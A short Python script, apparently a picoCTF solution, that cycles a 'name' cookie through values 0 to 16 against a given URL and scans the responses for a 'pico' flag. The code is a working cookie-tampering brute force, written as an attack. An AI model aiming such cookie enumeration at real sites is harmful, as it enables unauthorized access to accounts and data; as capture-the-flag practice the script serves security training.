import requests
import urllib3
from sys import argv
import re
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def get_website_urls():
    if len(argv) != 2:
            print(f"[+] usage {argv[0]} <url>")
            exit(-1)
    if argv[1][-1] == '/':
            url = argv[1][:-1]
    else:
        url = url = argv[1]
    return url

def send_to_exploit_server():
    url = get_website_urls()
    pattern = re.compile(r'pico.*?}')
    for i in range(17):
        cookies = {
            "name":f"{i}"
            }
        r = requests.get(url, cookies=cookies)
        matches = pattern.findall(r.text)
        if matches:
            print("[+] attack successful")
            print(f"your flag => {matches}")
            exit(0)
    print("[-] attack unsuccessfully")    

print("[+] Starting attack")
send_to_exploit_server()